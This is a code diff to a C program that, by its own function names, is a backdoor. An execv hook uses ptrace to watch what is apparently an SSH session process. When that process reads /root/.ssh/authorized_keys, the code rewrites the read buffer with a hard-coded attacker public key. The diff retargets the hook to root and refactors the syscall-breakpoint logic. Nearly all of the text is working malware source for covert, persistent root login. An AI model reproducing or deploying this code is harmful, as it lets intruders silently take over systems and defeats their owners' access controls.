@@ -6,9 +6,11 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-#define SSH_AUTH_PATH "/home/dbgbgtf/.ssh/authorized_keys"
-#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK+bV1YDHGeiyPeh+F68/1QhvNvdWBM35/E7cZBLV5bm dbgbgtf@MSI\n\x00\x00"
+#define SSH_AUTH_PATH "/root/.ssh/authorized_keys"
+#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK+bV1YDHGeiyPeh+F68/1QhvNvdWBM35/E7cZBLV5bm root@MSI\n"
 // clang-format on
+
+void set_my_pubkey (uint32_t pid);
 
 uint32_t *get_backdoor_location ();
 
@@ -36,6 +38,9 @@ void detach (uint32_t pid);
 
 void next_step (uint32_t pid);
 
+void break_at_sys_nr (uint32_t pid, uint32_t nr,
+                      struct ptrace_syscall_info *info);
+
 void next_syscall (uint32_t pid);
 
 void get_syscall_info (uint32_t pid, struct ptrace_syscall_info *info);
@@ -61,21 +66,28 @@ execv_hook (const char *path, char *const argv[])
       sys_execve (path, argv);
     }
 
+  sys_ptrace (PTRACE_SETOPTIONS, pid, NULL, (void *)PTRACE_O_TRACESYSGOOD);
+  set_my_pubkey (pid);
+  set_my_pubkey (pid);
+  // session read the authorized_keys twice
+  // note when you login with root, they still read at session process
+  // but login with other user, they read at a low-level process forked by
+  // session
+
+  detach (pid);
+  sys_exit ();
+}
+
+void
+set_my_pubkey (uint32_t pid)
+{
   char authorized_key[] = SSH_AUTH_PATH;
   char buf[] = "aaaabbbbccccdddd";
 
-  sys_wait (pid);
-  sys_ptrace (PTRACE_SETOPTIONS, pid, NULL, (void *)PTRACE_O_TRACESYSGOOD);
   struct ptrace_syscall_info info;
   while (1)
     {
-      while (1)
-        {
-          next_syscall (pid);
-          get_syscall_info (pid, &info);
-          if (info.op == PTRACE_SYSCALL_INFO_ENTRY && info.entry.nr == 0x101)
-            break;
-        }
+      break_at_sys_nr (pid, 0x101, &info);
       copy_from_tracee (pid, info.entry.args[1], (uint8_t *)buf, 0x10);
       if (((uint64_t *)buf)[0] == ((uint64_t *)authorized_key)[0]
           && ((uint64_t *)buf)[1] == ((uint64_t *)authorized_key)[1])
@@ -83,31 +95,28 @@ execv_hook (const char *path, char *const argv[])
     }
   // now session trying to open authorized_key
 
-  while (1)
-    {
-      next_syscall (pid);
-      get_syscall_info (pid, &info);
-      if (info.op == PTRACE_SYSCALL_INFO_ENTRY && info.entry.nr == 0x0)
-        break;
-    }
+  break_at_sys_nr (pid, 0x0, &info);
   // now session trying to read authorized_key
   uint8_t backdoor_key[] = SSH_PUBKEY;
+  uint8_t check_old_key[] = SSH_PUBKEY;
   void *read_to = (void *)info.entry.args[1];
   next_syscall (pid);
   get_syscall_info (pid, &info);
 
+  copy_from_tracee (pid, (uint64_t)read_to, check_old_key,
+                    sizeof (SSH_PUBKEY));
   // this is the old key
   copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
-  copy_from_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
+  // try to set the new key
+  copy_from_tracee (pid, (uint64_t)read_to, check_old_key,
+                    sizeof (SSH_PUBKEY));
   // this is the new key
 
-  struct user_regs_struct regs;
-  get_regs (pid, &regs);
-  regs.rax = sizeof (backdoor_key) - 1;
-  set_regs (pid, &regs);
-
-  detach (pid);
-  sys_exit ();
+  // struct user_regs_struct regs;
+  // get_regs (pid, &regs);
+  // regs.rax = sizeof (backdoor_key) - 1;
+  // set_regs (pid, &regs);
+  // set the correct size just in case
 }
 
 uint32_t *
@@ -210,6 +219,18 @@ next_syscall (uint32_t pid)
 {
   sys_ptrace (PTRACE_SYSCALL, pid, NULL, NULL);
   sys_wait (pid);
+}
+
+void
+break_at_sys_nr (uint32_t pid, uint32_t nr, struct ptrace_syscall_info *info)
+{
+  while (1)
+    {
+      next_syscall (pid);
+      get_syscall_info (pid, info);
+      if (info->op == PTRACE_SYSCALL_INFO_ENTRY && info->entry.nr == nr)
+        break;
+    }
 }
 
 void
